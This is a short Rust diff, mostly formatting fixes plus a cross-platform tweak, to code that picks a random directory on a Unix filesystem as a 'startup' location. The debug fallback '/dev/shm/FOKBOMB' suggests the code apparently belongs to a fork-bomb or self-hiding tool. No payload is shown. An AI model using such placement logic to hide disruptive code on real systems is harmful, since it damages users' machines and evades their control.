@@ -1,15 +1,15 @@
-#[cfg(unix)]
-use std::os::unix::ffi::OsStrExt;
 use crate::agtools;
 use rand::{RngExt, random, random_range};
 use std::fs;
 use std::fs::{DirEntry, File};
+#[cfg(unix)]
+use std::os::unix::ffi::OsStrExt;
 use std::path::Path;
 use walkdir::WalkDir;
 
 pub(crate) fn get_lin_start(startup: &mut String) {
     if !cfg!(debug_assertions) {
-    startup.push_str(&get_rnd_dir("/"));
+        startup.push_str(&get_rnd_dir("/"));
     } else {
         startup.clear();
         startup.push_str("/dev/shm/FOKBOMB");
@@ -55,10 +55,15 @@ pub(crate) fn get_rnd_dir(dir: &str) -> String {
     let blacklist: &[&[u8]] = &[b"/dev", b"/proc", b"/sys", b"/run", b"/var", b"/bin"];
 
     let entries = WalkDir::new(dir)
-        .max_depth(5) // Prevent traversing the entire disk
+        .max_depth(5)
         .into_iter()
         .filter_entry(|e| {
-            let pb = e.path().as_os_str().as_bytes();
+            let s: [u8; 0] = [];
+            let pb: &[u8] = if cfg!(unix) {
+                e.path().as_os_str().as_bytes()
+            } else {
+                &s
+            };
             !blacklist.iter().any(|&prefix| pb.starts_with(prefix))
         })
         .filter_map(|e| e.ok());
